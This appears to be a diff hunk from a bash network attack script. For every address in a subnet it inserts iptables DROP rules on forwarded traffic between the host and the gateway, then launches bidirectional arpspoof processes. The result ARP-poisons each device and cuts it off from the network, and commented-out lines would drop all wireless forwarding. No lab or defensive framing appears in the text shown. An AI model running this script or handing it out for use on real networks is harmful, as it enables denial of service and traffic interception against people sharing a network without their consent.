@@ -58,14 +58,16 @@ for TARGET in $TARGET_IPS; do
             START=$(ip2int $HOSTMIN)
             END=$(ip2int $HOSTMAX)
             for ((i=START; i<=END; i++)); do
-                TARGET_IP=$(int2ip $i)
-
-                VALUE="${MYIP:-$TARGET_IP}"
+            TARGET_IP=$(int2ip $i)
                 (
                     # Block all the traffic except the device ip and gateway (bidirectional)
-                    iptables -I FORWARD ! -s "$VALUE" -d "$GATEWAY" -j DROP
-                    iptables -I FORWARD ! -s "$GATEWAY" -d "$VALUE" -j DROP
-        
+                    iptables -I FORWARD -s "$TARGET_IP" -d "$GATEWAY" -j DROP
+                    iptables -I FORWARD -s "$GATEWAY" -d "$TARGET_IP" -j DROP
+                    
+                    # Drop all packets 
+                    # iptables -I FORWARD -i wlan0 -j DROP
+                    # iptables -I FORWARD -o wlan0 -j DROP
+                    
                     arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                     arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                 ) &
